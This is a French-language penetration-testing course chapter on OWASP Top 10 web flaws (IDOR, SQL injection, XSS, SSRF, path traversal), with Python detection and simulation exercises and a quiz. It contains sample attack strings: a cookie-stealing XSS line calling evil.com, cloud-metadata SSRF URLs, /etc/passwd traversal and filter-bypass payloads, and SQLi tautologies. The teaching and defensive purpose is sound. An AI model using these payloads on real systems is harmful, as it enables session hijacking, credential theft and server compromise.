Chapitre 4 — Exploitation des Vulnérabilités Web (OWASP Top 10 & Injection)

Module 4 ≈ 2 h 45 de travail Réservé B3 et plus
Mise en situation

Les applications web et API REST constituent la cible d'attaque la plus exposée et la plus vulnérable des entreprises contemporaines. Une simple absence de contrôle d'autorisation (IDOR) permet de télécharger les fiches de paie de l'ensemble du personnel, tandis qu'une injection SQL aveugle ou une inclusion de fichier local (LFI) peut déboucher sur l'exécution arbitraire de commandes sur le serveur sous-jacent. En tant que pentesteur B3, vous devez maîtriser les rouages intimes des failles de l'OWASP Top 10, manier avec précision Burp Suite et démontrer la faisabilité d'exploits éthiques tout en recommandant les remédiations architecturales définitives.

Objectifs pédagogiques

À la fin de ce chapitre, tu seras capable de :

  1. maîtriser la taxonomie de l'OWASP Top 10 et identifier les failles de contrôle d'accès (IDOR) ;
  2. exploiter et sécuriser les injections SQL sous toutes leurs variantes (UNION, Blind, Time-based) ;
  3. différencier les attaques XSS (Stored, Reflected, DOM) et comprendre l'impact sur le vol de cookies de session ;
  4. analyser le mécanisme des attaques SSRF (Server-Side Request Forgery) contre les métadonnées Cloud (AWS/GCP/Azure) ;
  5. démontrer l'exploitation de traversées de répertoire (Path Traversal / LFI) avec contournements d'encodage ;
  6. utiliser professionnellement Burp Suite (Proxy, Repeater, Intruder) et sqlmap pour automatiser l'audit applicatif.

1. Taxonomie de l'OWASP Top 10 & Défaillances de Contrôle d'Accès (A01 / IDOR)

Le projet OWASP (Open Web Application Security Project) publie la référence mondiale des risques applicatifs les plus critiques :

A01:2021 — Broken Access Control

La faille n°1 mondiale. Survient lorsque l'application ne vérifie pas côté serveur si l'utilisateur authentifié a le droit d'accéder à la ressource demandée.

Exemple type : IDOR (Insecure Direct Object Reference). Un utilisateur modifie un paramètre dans l'URL (ex: GET /api/documents/1042 vers GET /api/documents/1001) et accède aux documents d'un autre client sans contrôle d'autorisation.

A02:2021 — Cryptographic Failures

Transmission de données sensibles en clair (HTTP au lieu de HTTPS), stockage de mots de passe sans hachage salé robuste (MD5/SHA-1 au lieu de bcrypt/Argon2id), ou utilisation de clés cryptographiques faibles ou codées en dur dans le code source.

2. Injections SQL Approfondies : In-Band, Inférentielles & Remédiation

L'injection SQL (A03:2021-Injection) intervient lorsqu'une entrée non filtrée est concaténée dynamiquement dans une requête SQL :

Type d'Injection SQLMécanisme d'ExploitationVisibilité des Données
In-Band (UNION-based)Injection de l'opérateur UNION SELECT pour adjoindre le résultat d'une autre table au résultat légitime. Requiert un nombre de colonnes et des types compatibles.Affichage direct dans le code HTML de la page de réponse.
In-Band (Error-based)Déclenchement délibéré d'une erreur SQL syntaxique ou de conversion de type qui fait fuiter la donnée secrète dans le message d'erreur renvoyé.Visible dans les messages d'erreur de la base de données.
Blind (Boolean-based)Injection de conditions booléennes (AND 1=1 vs AND 1=2). La page renvoie un contenu légèrement différent selon que la condition est vraie ou fausse.Aucune donnée directe. Inférence par vrai/faux sur l'état de la page.
Blind (Time-based)Injection de fonctions de délai conditionnelles (IF(condition, SLEEP(5), 0)). Si la supposition est juste, le serveur met 5 secondes à répondre.Aucune donnée visible. Mesure du temps de réponse HTTP.
L'Unique Remédiation Définitive : Les Requêtes Préparées (Prepared Statements)

L'échappement manuel des caractères ou les listes noires de mots-clés sont voués à l'échec. L'unique défense absolue contre les injections SQL est l'utilisation universelle de requêtes paramétrées :

,
// EXEMPLE SÉCURISÉ (PHP PDO avec requêtes préparées)
$stmt = $pdo->prepare("SELECT id, email FROM users WHERE username = :user AND password_hash = :pwd");
$stmt->execute([":user" => $input_user, ":pwd" => $input_pwd]);
$user = $stmt->fetch();
,

Le compilateur SQL analyse et verrouille l'arbre syntaxique de la requête avant d'injecter les variables comme de simples valeurs littérales inoffensives.

3. Vulnérabilités Côté Client : XSS (Cross-Site Scripting) & CSRF

Les vulnérabilités client-side ciblent le navigateur des utilisateurs légitimes plutôt que le serveur de base de données :

XSS Stockée (Stored / Persistent)

Le script malveillant (ex: <script>fetch("http://evil.com/steal?c="+document.cookie)</script>) est stocké de manière permanente dans la base (forum, profil, commentaire).

Chaque utilisateur consultant la page exécute le script à son insu. Faille critique pour le vol de session.

XSS Réfléchie (Reflected)

La charge utile est injectée dans un paramètre d'URL (ex: recherche) et immédiatement renvoyée par le serveur dans la page sans échappement.

L'attaquant doit piéger la victime en lui faisant cliquer sur un lien forgé (phishing).

XSS Basée sur le DOM (DOM-based)

La vulnérabilité réside entièrement dans le code JavaScript côté client qui lit une source non fiable (location.hash, location.search) et l'injecte dans un récepteur dangereux (innerHTML, eval()) sans passer par le serveur.

Défense en Profondeur contre le Vol de Session XSS

Pour empêcher un script malveillant d'accéder aux jetons d'authentification :

,
    ,
  • Attribut de cookie HttpOnly : interdit formellement à l'API JavaScript document.cookie de lire le cookie de session dans le navigateur.
    • ,
  • Content Security Policy (CSP) : politique restrictive dans les en-têtes HTTP bloquant l'exécution de scripts inline non signés (script-src 'self').
    • ,
  • Attribut SameSite=Strict ou Lax : protège contre les attaques de type Cross-Site Request Forgery (CSRF).
    • ,

4. Vulnérabilités Serveur Critiques : SSRF, RCE & Path Traversal (LFI)

Certaines défaillances permettent à un attaquant d'interagir directement avec les systèmes internes :

SSRF (Server-Side Request Forgery)

L'application web prend une URL en paramètre (ex: aperçu d'image, webhook) et effectue une requête HTTP depuis le serveur cible.

L'attaquant fournit une URL interne inaccessible depuis Internet :

  • http://169.254.169.254/latest/meta-data/ : extraction des clés d'accès IAM sur AWS ou GCP (Metadata API).
  • http://localhost:8080/admin : accès aux interfaces d'administration internes isolées.

Traversée de Répertoire & LFI

L'application charge un fichier à partir d'un paramètre non vérifié (ex: template=fr.php).

En injectant des séquences de remontée ../../../../etc/passwd, l'attaquant lit les fichiers système.

Si la fonction exécute le code inclus (LFI PHP avec include), l'attaquant peut combiner la LFI avec un empoisonnement de logs pour obtenir une RCE complète.

5. Boîte à Outils Professionnelle d'Audit Web : Burp Suite & sqlmap

L'audit de sécurité des applications web s'appuie sur un outillage d'interception incontournable :

Burp Suite Proxy & Repeater

Intercepte tout le trafic HTTP/HTTPS entre le navigateur et le serveur. Permet de modifier à la volée en-têtes, cookies et paramètres POST (Repeater) pour tester les contrôles d'accès.

Burp Intruder & Fuzzers (ffuf)

Automatisation d'attaques par dictionnaire : fuzzing de répertoires cachés, brute-force de paramètres, énumération d'identifiants et tests de contournement d'authentification.

sqlmap

Outil open-source de référence pour la détection et l'exploitation automatisée des injections SQL (fingerprinting de SGBD, extraction de tables, dump de hashes et obtention de shell OS via --os-shell).

Ces trois exercices se font dans la page. L’éditeur du navigateur exécute votre code sur un service distant, puis la validation fait tourner des tests que vous ne voyez pas : réussir l’exemple affiché ne suffit donc pas, il faut traiter le cas général.

Exercice 1 — Détecteur de Vecteurs d'Injection SQL (SQLi Pattern Analyzer)

Python Niveau 1 — Acquisition

Objectif : Analyser une chaîne de paramètres HTTP pour détecter et classifier les signatures d'injection SQL.

L'injection SQL (A03:2021-Injection dans l'OWASP Top 10) survient lorsqu'une entrée utilisateur non nettoyée est concaténée dans une commande SQL.

Types de motifs surveillés (insensibles à la casse) :
1. SQLI_UNION : contient UNION SELECT ou UNION ALL SELECT.
2. SQLI_TAUTOLOGY : contient OR 1=1, OR '1'='1', OR "1"="1" ou OR ""="".
3. SQLI_STACKED : contient ; DROP, ; INSERT, ; UPDATE, ; DELETE ou ; WAITFOR.
4. SQLI_COMMENT : contient --, /* ou # en fin ou milieu de chaîne suspecte.

Priorité d'attribution : SQLI_UNION > SQLI_TAUTOLOGY > SQLI_STACKED > SQLI_COMMENT.

Entrée STDIN : SQLI_CHECK param=<valeur>.
Sortie :
- Si injection : SQLI_ALERT: pattern=<TYPE> severity=CRITICAL status=INJECTION_DETECTED
- Si sain : SQLI_ALERT: pattern=NONE severity=NONE status=CLEAN_PARAM

Entrée du programme
SQLI_CHECK param=admin' OR '1'='1' --
Sortie attendue
SQLI_ALERT: pattern=SQLI_TAUTOLOGY severity=CRITICAL status=INJECTION_DETECTED

Tautologie booléenne classique permettant le contournement d'authentification.

Deux indices, rédigés en mots
  1. Extrayez la valeur du paramètre avec line.split("param=", 1)[1] pour préserver les espaces.
  2. Convertissez la valeur en majuscules pour tester les mots-clés UNION SELECT, OR 1=1, etc.
  3. Vérifiez les motifs dans l'ordre de priorité spécifié.

Exercice 2 — Simulateur d'Attaque par Injection SQL Aveugle Basée sur le Temps

Python Niveau 2 — Application

Objectif : Simuler l'inférence de données caractère par caractère via des sondes temporelles (Time-Based Blind SQLi).

Quand une application web ne renvoie aucune erreur ni donnée dans ses pages, l'attaquant exploite une commande de temporisation (ex: IF(SUBSTRING(secret,1,1)='A', SLEEP(5), 0)).

Règles de simulation :
- Un secret est stocké sur la cible : actual_secret.
- Chaque sonde teste un couple pos:char (position 1-indexée).
- Si 1 <= pos <= len(actual_secret) et actual_secret[pos - 1] == char :
- La condition est TRUE, le délai simulé vaut 5.0s, caractère confirmé.
- Sinon :
- La condition est FALSE, le délai vaut 0.0s, caractère réfuté.

Entrée STDIN : TIME_INFER actual_secret=<secret> probes=<pos1:c1,pos2:c2,...>.
Sorties :
- Pour chaque sonde : PROBE: pos=<p> char=<c> match=<TRUE|FALSE> delay=<5.0|0.0>s
- Ligne récapitulative finale : EXTRACTED: confirmed_chars=<caractères_trouvés_dans_l_ordre|NONE> (chaîne des caractères validés concaténés dans l'ordre croissant de leur position unique).

Entrée du programme
TIME_INFER actual_secret=FLAG probes=1:F,1:B,2:L,3:A,4:G
Sortie attendue
PROBE: pos=1 char=F match=TRUE delay=5.0s
PROBE: pos=1 char=B match=FALSE delay=0.0s
PROBE: pos=2 char=L match=TRUE delay=5.0s
PROBE: pos=3 char=A match=TRUE delay=5.0s
PROBE: pos=4 char=G match=TRUE delay=5.0s
EXTRACTED: confirmed_chars=FLAG

Extraction complète des 4 caractères du secret grâce au délai de 5 secondes.

Deux indices, rédigés en mots
  1. Parcourez probes en découpant pos:char.
  2. Comparez char avec secret[pos - 1] si pos est dans les bornes.
  3. Conservez un dictionnaire {pos: char} des caractères validés pour reconstituer la chaîne finale.

Exercice 3 — Analyseur de Traversée de Répertoire et Inclusion de Fichiers (Path Traversal / LFI)

Python Niveau 3 — Raisonnement

Objectif : Détecter les tentatives de traversée de répertoire (Directory Traversal) et normaliser les chemins d'accès URI.

L'attaque par traversée de répertoire vise à accéder à des fichiers situés hors du dossier racine autorisé (ex: /etc/passwd, win.ini).

Algorithme de normalisation et détection :
1. Décodage d'URL : remplacer %2e%2e%2f et %2e%2e/ par ../, %2e%2e%5c par ..\.
2. Remplacer les séparateurs Windows \ par /.
3. Tronquer la chaîne si un octet nul (%00 ou \0) est injecté.
4. Résolution de chemin virtuel :
- Partir d'une liste vide de segments.
- Pour chaque segment entre les slashes / :
- Si . ou vide : ignorer.
- Si .. : dépiler le dernier segment s'il existe. Si la pile est déjà vide, marquer ESCAPED_ROOT = True.
- Sinon : empiler le segment.
5. Décision de sécurité :
- Si ESCAPED_ROOT est Vrai ou si le chemin résolu cible un fichier système sensible (passwd, shadow, hosts, win.ini) :
status=BLOCKED_TRAVERSAL, risk=CRITICAL.
- Sinon : status=SAFE_ACCESS, risk=LOW.

Entrée STDIN : LFI_CHECK path=<chemin_brut>.
Sortie : LFI_AUDIT: input=<path> resolved=</seg1/seg2|ROOT> status=<BLOCKED_TRAVERSAL|SAFE_ACCESS> risk=<CRITICAL|LOW>.

Entrée du programme
LFI_CHECK path=../../../../etc/passwd
Sortie attendue
LFI_AUDIT: input=../../../../etc/passwd resolved=/etc/passwd status=BLOCKED_TRAVERSAL risk=CRITICAL

Tentative d'évasion de racine pour lire le fichier système des comptes Linux.

Deux indices, rédigés en mots
  1. Normalisez les encodages URL (%2e%2e%2f -> ../).
  2. Tronquez à %00 si présent.
  3. Gérez la pile de segments et détectez si une tentative de sortie de racine survient.

7. QCM — niveau examen

Quelle vulnérabilité occupe la 1ère place du classement de l'OWASP Top 10 (A01:2021) ?

Broken Access Control est classé n°1 de l'OWASP Top 10 : il permet à un utilisateur non autorisé d'agir sur des ressources d'autres utilisateurs en modifiant simplement des paramètres (IDOR).

Dans une injection SQL de type UNION-based, quelle condition technique impérative doit être respectée pour que la requête UNION s'exécute avec succès ?

L'opérateur SQL UNION exige strictement que les deux requêtes combinées comportent le même nombre de colonnes et que les types de données correspondants soient compatibles.

Quelle est la seule mesure de protection absolue et définitive préconisée par l'OWASP contre les injections SQL ?

Les requêtes préparées compilent la structure de la requête indépendamment des données : les entrées utilisateur ne peuvent plus altérer la logique syntaxique de la commande SQL.

Quel attribut de cookie HTTP empêche formellement un script malveillant injecté via XSS d'accéder à la valeur du cookie de session via document.cookie ?

L'attribut HttpOnly indique au navigateur de refuser tout accès au cookie depuis les scripts JavaScript côté client (document.cookie), protégeant ainsi le jeton de session du vol par XSS.

Dans quel scénario une attaque XSS est-elle qualifiée de "Stockée" (Stored ou Persistante) ?

Une XSS stockée (Stored) réside de manière permanente dans la base de données (ex: commentaire de forum) et infecte automatiquement chaque utilisateur légitime consultant la page.

Quelle est la cible classique d'une attaque SSRF (Server-Side Request Forgery) exécutée contre une application hébergée dans le Cloud (AWS/GCP) ?

Dans le Cloud (AWS, GCP, Azure), l'adresse locale 169.254.169.254 expose un service interne de métadonnées non authentifié qui divulgue les identifiants temporaires du rôle IAM de la machine.

Quel composant de Burp Suite est spécialement conçu pour rejouer, modifier manuellement et analyser pas à pas des requêtes HTTP unitaires ?

Burp Repeater permet de renvoyer une requête HTTP capturée, de modifier ses paramètres ou en-têtes et d'observer immédiatement la réponse du serveur cible.

Comment une vulnérabilité de traversée de répertoire (Path Traversal) peut-elle être exploitée même si l'application filtre les deux points successifs "..//" de façon basique ?

Si le filtre supprime "..//" en une seule passe non récursive, la chaîne "....//" devient "../". De même, l'encodage URL (%2e%2e%2f) contourne les filtres qui vérifient la chaîne brute avant décodage.

8. Erreurs classiques — récapitulatif

À reconnaître en examen
  • Tenter de sécuriser les injections SQL par des listes noires de mots-clés facilement contournables par obfuscation.
  • Oublier l'attribut HttpOnly sur les cookies de session, laissant le jeton d'authentification vulnérable au vol par XSS.
  • Se fier aux contrôles d'accès effectués uniquement côté client en JavaScript sans validation côté serveur.
  • Supposer qu'une injection aveugle (Blind SQLi) est inexploitable parce qu'aucune donnée ne s'affiche dans la page.

9. Méthodologie de résolution

Démarche d’ingénierie pas à pas
  1. Intercepter et cartographier l'arborescence de l'application web avec le proxy Burp Suite.
  2. Tester les contrôles d'accès en permutant les identifiants d'objets (IDOR) entre différents comptes.
  3. Auditer les points d'entrée pour détecter les injections SQL (in-band, booléennes et basées sur le temps).
  4. Rechercher les failles XSS en observant le contexte d'échappement des entrées réfléchies ou stockées.
  5. Tester les traversées de répertoire avec des contournements d'encodage URL (%2e%2e%2f) et des null bytes.

10. Révision active

Résumé essentiel
  • Broken Access Control est la vulnérabilité web n°1 mondiale selon l'OWASP : elle frappe directement la logique métier.
  • Les requêtes préparées avec paramètres liés constituent l'unique remédiation définitive contre les injections SQL.
  • Les failles XSS permettent le vol de sessions utilisateurs, contré en profondeur par HttpOnly et les politiques CSP.
  • Les attaques SSRF exposent les architectures Cloud en ciblant l'API interne de métadonnées non authentifiée.
  • Les traversées de répertoire (Path Traversal / LFI) peuvent déboucher sur une exécution de code via log poisoning.

Checklist de maîtrise

  • Je maîtrise l'exploitation et la remédiation des injections SQL avec Prepared Statements.
  • Je sais différencier XSS Stored, Reflected et DOM et mettre en œuvre les en-têtes CSP et HttpOnly.
  • Je comprends le mécanisme des attaques SSRF contre les architectures Cloud.
  • Je sais auditer et automatiser la détection des failles web à l'aide de Burp Suite et sqlmap.

Les 8 notions à connaître absolument

  1. Broken Access Control (A01) : Défaillance de contrôle d'accès permettant à un utilisateur d'agir sur des ressources non autorisées (IDOR).
  2. Injection SQL (SQLi) : Concaténation non assainie d'entrées utilisateur dans une requête SQL altérant la logique d'exécution de la base.
  3. Cross-Site Scripting (XSS) : Injection de scripts malveillants exécutés dans le navigateur des victimes légitimes (Stored, Reflected, DOM).
  4. Server-Side Request Forgery (SSRF) : Faille contraignant le serveur web à forger des requêtes HTTP vers des ressources internes (ex: 169.254.169.254).
  5. Path Traversal (Traversée de Répertoire) : Manipulation de paramètres de chemin via des séquences ../ pour accéder à des fichiers arbitraires hors racine.
